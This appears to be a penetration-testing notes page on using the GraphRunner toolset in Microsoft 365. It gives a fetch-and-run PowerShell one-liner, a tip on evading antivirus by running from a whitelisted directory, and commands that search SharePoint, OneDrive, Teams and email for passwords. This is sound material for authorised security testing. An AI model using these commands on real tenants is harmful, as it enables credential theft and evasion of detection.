---
title: GraphRunner
source_url: https://notes.incendium.rocks/pentesting-notes/cloud/azure/authenticated-enumeration/graphrunner
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: cloud
---
An excellent tool for finding loot in Microsoft 365 environments is the `GraphRunner` post-exploitation toolset. We can download and import the GraphRunner PowerShell script. It will be heavily signatured so we'll execute it from a whitelisted directory.

```powershell
IEX (iwr 'https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1')
```

Get a graph session:

```
Get-GraphTokens
```

Download SharePoint and OneDrive files that contain "password"

```
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'password'
```

Teams is commonly used by organizations and we can use the `Invoke-SearchTeams` module that can search all Teams messages in all channels that are readable by the current user, as well as notes/chat that the user sends to themselves.

```
Invoke-SearchTeams -Tokens $tokens -SearchTerm password
```

Search email:

```
Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password" -MessageCount 40
```
